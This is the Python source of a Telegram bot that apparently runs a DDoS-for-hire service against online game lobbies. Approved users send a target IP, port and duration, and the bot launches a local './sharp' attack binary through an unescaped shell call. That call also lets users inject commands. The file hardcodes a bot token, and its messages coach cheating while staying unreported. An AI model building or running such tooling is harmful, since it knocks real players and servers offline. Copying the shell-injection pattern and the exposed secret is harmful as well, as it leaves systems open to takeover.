import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7454484515:AAHg3tCif3BUDrQvakzce77xr1nZD_eZqgY'
ADMIN_USER_ID = 5304587644
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = ("""🌍 WELCOME TO DDOS WORLD! 🎉

🚀 Get ready to dive into the action!

💣 To unleash your power, use the /bgmi command followed by your target's IP and port. ⚔️

🔍 Example:  /attack, enter: ip port duration.

🔥 Ensure your target is locked in before you strike!

📚 New around here? Check out the /help command to discover all my capabilities. 📜

⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign! 😈💥""")
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
    
    
async def owner(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = ("""👤 Owner Information:

For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:

📩 Telegram: @smokiemods

💬 We value your feedback! Your thoughts and suggestions are crucial for improving our service and enhancing your experience.

🌟 Thank you for being a part of our community! Your support means the world to us, and we’re always here to help!""")
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def canary(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (""" 🦅 Grab the latest Canary version for cutting-edge features. 🎉
please use link for canary download:
https://t.me/c/1514987284/208 😈💥""")
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
async def rules(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = ("""📜 Bot Rules - Keep It Cool!

1. No spamming attacks! ⛔️ 
Rest for 5-6 matches between DDOS.

2. Limit your kills! 🔫 
Stay under 30-40 kills to keep it fair.

3. Play smart! 🎮 
Avoid reports and stay low-key.

4. No mods allowed! 🚫 
Using hacked files will get you banned.

5. Be respectful! 🤝 
Keep communication friendly and fun.

6. Report issues! 🛡️ 
Message TO Owner for any problems.

💡 Follow the rules and let’s enjoy gaming together!""")
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = ("""🌟 Welcome to the Ultimate Command Center!

Here’s what you can do: 
1. `/attack` - ⚔️ Launch a powerful attack and show your skills!
2. `/owner` - 📞 Get in touch with the mastermind behind this bot!
3. `/canary` - 🦅 Grab the latest Canary version for cutting-edge features.
4. `/rules` - 📜 Review the rules to keep the game fair and fun.

💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!""")
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def sharp(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /sharp <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./sharp {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our Smokie PUBLIC!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        return

    #if attack_in_progress:
        #await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
       # return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Enjoy And Fuck Whole Lobby  💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("owner", start))
    application.add_handler(CommandHandler("canary", start))
    application.add_handler(CommandHandler("rules", start))
    application.add_handler(CommandHandler("sharp", sharp))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
